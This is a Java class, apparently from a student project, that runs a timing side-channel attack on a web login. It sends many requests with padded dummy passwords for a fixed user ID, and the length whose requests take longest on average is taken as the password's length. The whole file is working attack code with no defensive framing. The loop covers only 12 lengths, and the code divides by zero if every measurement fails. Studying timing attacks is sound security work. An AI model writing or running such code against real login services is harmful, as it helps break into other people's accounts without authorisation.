package MainProject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;

public class CheckPasswordLength {

    private String URL;
    private ArrayList<Double> timeMeasurements;
    private final int maxLength = 32;

    public CheckPasswordLength(String url) {
        this.URL = url+"?user=307832972&password=";
        //String.format()
        timeMeasurements = new ArrayList<>();
    }

    /**
     * this function try different lengths and measure their connections to the site
     * fill the ArrayList with sum of times off all length
     */
    public void measureConnectionWithDifferentLength(){

        String tempURL = URL;

        for (int i=20;i<maxLength;i++){
            measureConnectionToGivenLength(tempURL);
            tempURL+="a";
        }
    }

    /**
     * this function will measure connection time to a given length
     * help func to measureConnectionWithDifferentLength()
     * @param tempURL - url that represents the given length
     */

    private void measureConnectionToGivenLength(String tempURL) {
        ArrayList<Double> tempArr= new ArrayList<>();
        double totalMeanTime = 0;
        try{

            for(int i=0;i<100;i++){
                TimeToConnect tmc = new TimeToConnect(tempURL);
                double time = (Double) tmc.timeToConnect();
                if(time>0){
                    tempArr.add(time);
                    totalMeanTime+=time;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
            System.out.println("error measure time for url: "+ tempURL);
        }

        totalMeanTime = totalMeanTime/tempArr.size();
        timeMeasurements.add(totalMeanTime);
    }

    /**
     * method to get the length of the password.
     * @return the index of max value in timeMeasurements array ==> the length of the password.
     */
    public int getLength(){
        for (double d: timeMeasurements){
            System.out.println(d);
        }
        double maxValue=  Collections.max(timeMeasurements);
        System.out.println("The max time of measurement is "+maxValue );
        return timeMeasurements.indexOf(maxValue);
    }


}
